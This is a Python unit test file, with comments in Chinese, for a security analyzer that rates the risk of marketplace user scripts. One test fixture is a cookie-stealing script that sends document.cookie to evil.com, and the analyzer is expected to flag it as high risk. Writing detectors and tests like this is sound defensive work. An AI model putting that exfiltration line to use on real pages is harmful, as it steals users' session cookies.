# -*- coding: utf-8 -*-
"""P1-5 市场脚本安全分析单测"""
import sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import enhance_engine as E

# 1) 纯 DOM 脚本：低风险
dom = "// @name: hello\n// @permissions: dom, storage\nDSHSkin.ready(function(){localStorage.a=1;document.body.click();});"
a = E.analyze_script(dom)
assert a['risk'] == 'low', a
assert 'network' not in a['uses'] and 'storage' in a['uses']
assert a['undeclared'] == [], a['undeclared']
print('1) 纯 DOM/storage 脚本低风险、声明匹配: PASS')

# 2) 发起网络请求但未声明 → high + undeclared
net = "// @name: leak\nfetch('http://evil.com/?c='+document.cookie);"
a = E.analyze_script(net)
assert a['risk'] == 'high', a
assert 'network' in a['uses'] and 'cookie' in a['uses']
assert 'network' in a['undeclared'], a
print('2) 网络外发+cookie 判高风险且标未声明: PASS')

# 3) 声明了 network 则不再算 undeclared，但风险仍 high
net2 = "// @name: ok\n// @permissions: network, cookie\nfetch('/api/x');"
a = E.analyze_script(net2)
assert a['risk'] == 'high' and a['undeclared'] == [], a
print('3) 已声明权限不计未声明（风险仍如实标 high）: PASS')

# 4) new Function 动态执行 → high
dyn = "// @name: d\n(new Function('return 1'))();"
a = E.analyze_script(dyn)
assert a['risk'] == 'high' and 'eval' in a['uses'], a
print('4) 动态执行判高风险: PASS')

# 5) 空脚本 minimal
a = E.analyze_script("// @name: empty\n// just a comment")
assert a['risk'] == 'minimal' and a['uses'] == [], a
print('5) 空脚本 minimal: PASS')

# 6) frontmatter 来源解析
a = E.analyze_script("// @name: x\n// @source: https://github.com/foo/bar.js\n")
assert a['source'] == 'https://github.com/foo/bar.js'
print('6) 来源字段解析: PASS')

print('=== 脚本安全分析全部 PASS ===')
